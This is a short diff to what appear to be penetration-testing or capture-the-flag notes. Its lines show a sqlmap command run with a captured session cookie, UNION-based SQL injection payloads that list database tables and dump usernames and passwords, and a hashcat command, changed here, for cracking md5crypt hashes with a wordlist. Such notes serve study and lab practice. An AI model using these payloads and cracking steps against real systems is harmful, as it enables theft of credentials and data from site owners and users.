@@ -204,7 +204,7 @@ $ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME
 •	?id=1' UNION SELECT null, table_name FROM information_schema.tables—
 •	?id=1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'—
 •	?id=1' UNION SELECT username, password FROM users WHERE username='Sarah'--
--hashcat -m hash.txt
+-hashcat -m 500 example500.hash /usr/share/wordlists/sqlmap.txt
 OR
 -/?id=4 UNION SELECT 1,2--
 -/?id=4 UNION SELECT null, table_name FROM information_schema.tables--
